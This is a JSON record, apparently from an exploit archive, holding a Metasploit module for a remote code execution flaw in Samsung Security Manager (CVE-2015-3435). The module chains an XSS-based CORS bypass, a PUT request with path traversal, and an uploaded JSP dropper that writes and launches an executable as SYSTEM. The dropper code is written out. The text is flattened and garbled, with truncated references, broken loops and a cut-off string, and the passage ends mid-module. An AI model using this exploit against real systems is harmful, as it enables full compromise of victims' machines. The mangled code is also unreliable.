{
    "text": "vul_name : Samsung Security Manager 1.5 ActiveMQ Broker Service PUT Method Remote Code Execution ， vul_cve : CVE-2015-3435 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : EXE ， include Msf : Exploit : Remote : HttpServer : HTML ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => \"Samsung Security Manager 1.5 ActiveMQ Broker Service PUT Method Remote Code Execution\" ,  ， 'Description' => %q{ ， This is an exploit against Samsung Security Manager that bypasses the patch in ， CVE-2015-3435 by exploiting the vulnerability against the client side. This exploit has ， been tested successfully against IE , FireFox and Chrome by abusing a GET request XSS to ， bypass CORS and reach the vulnerable PUT. Finally , a traversal is used in the PUT request ， to upload the code just where we want it and gain Remote Code Execution as SYSTEM. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'mr_me <mr_me [ at ] offensive-security.com>' ,  # vuln + module ，  ]  ,  ， ' ，  [  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Platform' => 'win' ,  ， 'Targets' => ，  [  ，  # tested on 1.32 , 1.4 & 1.5 ，  [ 'Samsung Security Manager 1.32 , 1.4 & 1.5 Universal' , {} ]  ,  ，  ]  ,  ， 'DisclosureDate' => \"Aug 05 2016\" ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptBool.new ( 'OBFUSCATE' ,  [ false , 'Enable JavaScript obfuscation' ]  )  ，  ]  , self.class )  ， end ，  # this is because String.fromCharCode has a max of 65535 func args ，  # thanks to sinn3r for his help with the Array->String conversion ， i = 0 ， encoded_0 = [  ]  ， encoded_1 = [  ]  ， string.each_byte do | c |  ， encoded_1 c ， encoded_0 c ， end ， i += 1 ， end ， end ， end ，  # tested on Firefox v46.0.1 ( latest )  ，  # tested on Chrome v50.0.2661.102 ( latest release )  ，  # tested on IE v11.0.9600.18314 ( latest )  ， js_name = rand_text_alpha ( rand ( 10 ) +5 ) + '.js' ， payload_url = \" ， payload_url += ( datastore [ 'SRVHOST' ] = '0.0.0.0' ) ? Rex : Socket.source_address ( cli.peerhost )  : datastore [ 'SRVHOST' ]  ， payload_url += \" : \" + datastore [ 'SRVPORT' ] .to_s + get_resource (  ) + \"/\" + js_name ，  # we deliver the JavaScript code that does the work for us ，  # dont exploit again otherwise we get a zillion shells ， jsp_name = rand_text_alpha ( rand ( 10 ) +5 ) + '.jsp' ， exe_name = rand_text_alpha ( rand ( 10 ) +5 ) + '.exe' ，  # clean just the jsp , because the exe dropper will be in use ， register_files_for_cleanup ( \"././webapps/admin/ # {jsp_name}\" )  ，  # our jsp upload , ensuring native code execution ， jsp = %Q | <% @ page import=\"java.io. * \" %> ， <% ， ByteArrayOutputStream buf = new ByteArrayOutputStream (  )  ;  ， BufferedReader reader = request.getReader (  )  ;  ， int tmp ;  ， FileOutputStream fostream = new FileOutputStream ( \" # {exe_name}\" )  ;  ， buf.writeTo ( fostream )  ;  ， fostream.close (  )  ;  ， Runtime.getRuntime (  ) .exec ( \" # {exe_name}\" )  ;  ， %> |  ，  # encode the payloads",
    "time": "2016.08.06"
}